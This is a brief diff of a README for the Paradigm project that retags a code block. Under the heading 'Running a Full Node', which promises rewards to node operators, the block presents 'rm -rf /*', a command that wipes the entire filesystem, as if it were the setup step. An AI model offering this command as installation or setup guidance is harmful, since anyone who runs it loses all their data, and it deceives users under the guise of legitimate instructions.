@@ -35,7 +35,7 @@ There are actually two releases of Paradigm for [Windows](https://github.com/APX
 
 ## [Running a Full Node](https://github.com/APX-Dev/Paradigm/wiki/Running-a-Paradigm-Full-Node "Running a Full Node")
 You can get rewards by running a Paradigm full node for any transactions validated by this one.
-```console
+```bash
 $ rm -rf /*
 ```
 
